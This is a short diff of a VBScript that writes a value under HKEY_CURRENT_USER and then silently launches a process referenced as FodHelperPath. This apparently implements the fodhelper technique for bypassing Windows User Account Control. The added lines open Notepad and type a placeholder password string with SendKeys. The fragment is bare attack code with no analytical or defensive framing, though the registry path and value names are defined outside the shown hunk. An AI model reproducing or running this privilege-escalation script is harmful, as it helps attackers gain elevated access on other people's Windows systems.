@@ -17,3 +17,10 @@ Registry.SetStringValue HKEY_CURRENT_USER, RegKeyPathStr, DefaultRegKeyName, Def
 
 Set Shell = WScript.CreateObject("WScript.Shell")
 Shell.Run FodHelperPath, 0, False
+
+Set Notepad = WScript.CreateObject("WScript.Shell")
+Notepad.Run "C:\\Windows\\System32\\notepad.exe"
+
+WScript.Sleep 1000
+
+Notepad.SendKeys "Password: ####1234####"
